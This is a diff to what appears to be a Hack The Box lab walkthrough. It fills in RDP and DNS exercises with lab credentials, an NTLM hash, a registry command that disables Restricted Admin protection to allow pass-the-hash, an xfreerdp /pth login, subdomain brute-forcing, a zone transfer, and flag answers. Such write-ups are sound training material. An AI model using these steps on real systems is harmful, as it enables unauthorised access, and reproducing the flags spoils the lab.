@@ -653,8 +653,7 @@ Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
 dig any inlanefreight.htb @$ip
 ```
 
-Result: 
-ns.inlanefreight.htb
+Result:  ns.inlanefreight.htb
 
 
 
@@ -2377,24 +2376,95 @@ SELECT * FROM tb_flag
 Results: HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
 
 ### RDP
+RDP to  with user "htb-rdp" and password "HTBRocks!"
 
-Question.
+**What is the name of the file that was left on the Desktop? (Format example: filename.txt).**
 
 ```
-
+xfreerdp /d:$domain] /u:$user /p:$pass /v:$ip
 ```
 
-Results: 
+Results: pentest-notes.txt
+
+
+**Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**
+
+Reading the file pentest-notes.txt
+
+```
+We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.
+
+User: Administrator
+Hash: 0E14B9D6330BF16C30B1924111104824
+```
+
+Which means that RDP connection with pass the hash needs some troubleshooting. 
+*Restricted Admin Mode*, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
+
+```powershell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+
+Results: DisableRestrictedAdmin
+
+
+**Connect via RDP with the Administrator account and submit the flag.txt as you answer.**
+
+Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.
+
+```
+xfreerdp /d:$domain /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /v:$ip 
+```
+
+Results: `HTB{RDP_P4$$_Th3_H4$#}`
 
 ### DNS
 
-Question.
+Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.
 
 ```
+# Enumerate subdomains
+dnsenum --dnsserver 10.129.86.251 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
+# you will get the following subdomains:
+# ns.inlanefreight.htb, control.inlanefreight.htb, helpdesk.inlanefreight.htb
 
+
+# Install subbrute
+git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+
+# Access the tool
+cd subbrute
+
+# Configure resolver file 
+echo "ns.inlanefreight.htb" > ./resolvers.txt
+
+# Enumerate subdomains with subbrute
+python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
+# You will get the following subdomains:
+# hr.inlanefreight.htb
+
+# Attempt a zone transfer
+ dig AXFR @ns.inlanefreight.htb hr.inlanefreight.htb 
 ```
 
-Results: 
+
+```
+; <<>> DiG 9.19.21-1-Debian <<>> AXFR @ns.inlanefreight.htb hr.inlanefreight.htb
+; (1 server found)
+;; global options: +cmd
+hr.inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+hr.inlanefreight.htb.	604800	IN	TXT	"HTB{LUIHNFAS2871SJK1259991}"
+hr.inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
+ns.hr.inlanefreight.htb. 604800	IN	A	127.0.0.1
+hr.inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+;; Query time: 40 msec
+;; SERVER: 10.129.86.251#53(ns.inlanefreight.htb) (TCP)
+;; WHEN: Fri Nov 01 14:34:47 EDT 2024
+;; XFR size: 5 records (messages 1, bytes 230)
+```
+
+Results: HTB{LUIHNFAS2871SJK1259991}
 
 
 ### SMTP
